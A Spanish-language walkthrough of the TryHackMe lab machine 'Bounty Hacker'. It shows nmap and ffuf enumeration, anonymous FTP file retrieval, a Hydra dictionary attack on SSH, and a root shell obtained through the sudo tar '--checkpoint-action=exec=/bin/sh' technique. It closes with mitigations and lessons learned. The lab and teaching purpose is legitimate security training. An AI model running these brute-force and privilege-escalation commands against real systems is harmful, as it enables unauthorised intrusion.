# Bounty Hacker

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / FTP / SSH / Fuerza Bruta / Sudo / Tar

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.128.182.117
```

- Encontramos:

- `21/tcp` → FTP
- `22/tcp` → SSH
- `80/tcp` → HTTP

- El servidor FTP permite acceso anónimo.

### Enumeración FTP

- Accedemos al servicio FTP:

```bash
ftp 10.128.182.117
```

- Utilizamos:

```text
anonymous
```

- Enumeramos los archivos:

```text
ls
```

- Encontramos dos archivos:

```text
task.txt
locks.txt
```

- Descargamos ambos:

```text
get task.txt
get locks.txt
```

- `task.txt` contiene información relacionada con los usuarios:

```text
Spike
Jet
Edward
Ed
Ein
Faye
```

- La información nos da una pista sobre posibles usuarios del sistema.

- `locks.txt` parece ser un listado de contraseñas que podemos utilizar posteriormente para realizar un ataque de diccionario.

## 2. Enumeración

### Enumeración web

- Realizamos fuzzing sobre el servidor HTTP:

```bash
ffuf -u http://10.128.182.117/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- Inicialmente no encontramos nada especialmente relevante aparte de:

```text
/index.html
```

- Durante la resolución de la máquina fue necesario reiniciarla, por lo que la IP cambió a:

```text
10.128.160.231
```

- Repetimos la enumeración sobre la nueva IP y seguimos sin encontrar recursos web relevantes.

### Enumeración SSH

- Como tenemos una lista de posibles usuarios y un archivo que parece contener contraseñas, probamos las credenciales contra SSH.

- Empezamos probando el usuario `lin`:

```bash
hydra -l lin -P locks.txt ssh://10.128.160.231
```

- Hydra consigue encontrar una contraseña válida para `lin`.

## 3. Explotación

### Acceso mediante SSH

- Utilizamos las credenciales encontradas:

```bash
ssh lin@10.128.160.231
```

- Introducimos la contraseña obtenida mediante Hydra.

- Conseguimos acceder como:

```text
lin
```

### Mejorar la terminal

- Configuramos la variable `TERM`:

```bash
export TERM=xterm
```

- Ahora disponemos de una terminal más funcional.

- Comprobamos nuestro usuario:

```bash
whoami
```

- Obtenemos:

```text
lin
```

- Comprobamos nuestros grupos y privilegios:

```bash
id
```

- No encontramos nada especialmente interesante mediante los grupos.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos qué comandos puede ejecutar `lin` mediante `sudo`:

```bash
sudo -l
```

- Encontramos:

```text
(root) /bin/tar
```

- Esto significa que `lin` puede ejecutar `/bin/tar` como `root` mediante `sudo`.

### Abuso de `tar`

- `tar` permite ejecutar acciones mediante sus opciones `--checkpoint` y `--checkpoint-action`.

- Utilizamos la técnica conocida de GTFOBins:

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- La cadena funciona de la siguiente manera:

```text
sudo
 ↓
tar ejecutado como root
 ↓
--checkpoint=1
 ↓
se alcanza un checkpoint
 ↓
--checkpoint-action=exec=/bin/sh
 ↓
tar ejecuta /bin/sh
 ↓
shell con privilegios de root
```

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

### Flags

- Podemos acceder a la User Flag:

```bash
cat /home/lin/user.txt
```

- Y a la Root Flag:

```bash
cat /root/root.txt
```

## 5. Reporte

- La máquina **Bounty Hacker** expone FTP, SSH y HTTP.
- El servicio FTP permite acceso anónimo.
- Dentro del FTP encontramos `task.txt` y `locks.txt`.
- `task.txt` proporciona información sobre posibles usuarios y `locks.txt` contiene un listado de contraseñas.
- El fuzzing web no proporciona rutas relevantes.
- Utilizamos Hydra contra SSH con el usuario `lin` y `locks.txt` para recuperar una contraseña válida.
- Accedemos mediante SSH como `lin`.
- Comprobamos los permisos de `sudo` y descubrimos que `lin` puede ejecutar `/bin/tar` como `root`.
- Aprovechamos las opciones `--checkpoint` y `--checkpoint-action` de `tar` para ejecutar `/bin/sh` con los privilegios del proceso.
- Obtenemos una shell como `root` y accedemos a ambas flags.

### Cadena de ataque

```text
Nmap
 ↓
FTP Anonymous
 ↓
task.txt + locks.txt
 ↓
Lista de usuarios / contraseñas
 ↓
Hydra
 ↓
Credenciales de lin
 ↓
SSH
 ↓
lin
 ↓
sudo -l
 ↓
tar como root
 ↓
--checkpoint-action=exec=/bin/sh
 ↓
root
 ↓
User Flag + Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| FTP Anonymous Access | Media | Permite acceder a archivos sin autenticación |
| Credenciales débiles | Alta | Permiten acceso mediante fuerza bruta |
| `tar` permitido mediante sudo | Crítica | Permite ejecutar una shell como root |

### Mitigaciones

- Deshabilitar el acceso anónimo a FTP.
- No almacenar listas de contraseñas en recursos accesibles sin autenticación.
- Utilizar contraseñas fuertes y únicas.
- Implementar mecanismos de protección frente a ataques de fuerza bruta.
- Aplicar el principio de mínimo privilegio en `sudoers`.
- No permitir que usuarios sin privilegios ejecuten `tar` como `root` si no es necesario.

## 🧠 Lessons Learned

- FTP Anonymous puede revelar archivos útiles para continuar una intrusión.
- Las listas de usuarios y contraseñas pueden utilizarse para realizar ataques de diccionario contra otros servicios.
- Hydra permite automatizar ataques de fuerza bruta contra SSH.
- `sudo -l` es una comprobación fundamental para detectar comandos privilegiados.
- `tar` puede convertirse en un vector de escalada cuando se permite ejecutarlo como root porque dispone de opciones que permiten ejecutar comandos externos.
- Las técnicas de GTFOBins son útiles para identificar formas de abusar de binarios legítimamente instalados cuando se ejecutan con privilegios elevados.
